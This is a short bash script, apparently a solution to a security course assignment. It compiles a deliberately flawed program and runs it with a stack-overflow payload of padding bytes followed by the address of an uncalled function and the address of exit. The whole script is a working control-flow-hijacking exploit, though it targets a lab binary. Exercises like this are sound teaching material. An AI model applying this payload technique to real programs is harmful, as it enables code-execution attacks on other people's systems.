#!/bin/bash

# CD to the assignment directory
cd ./assignment

# make the project
make

# CD to the upper level directory
cd ..

# Define memory addresses (little endian encoding)
UNCALLED_ADDR='\xb6\x91\x04\x08' # starting addr of uncalled (gdb -> "disas uncalled")
EXIT_ADDR='\xd0\xee\xdf\xf7'	 # exit addr (gdb -> "p exit")

# Run the assignment
./assignment/flawed-program  $(python -c "print('A'*13 + 'B'*4 +'$UNCALLED_ADDR' + '$EXIT_ADDR')")
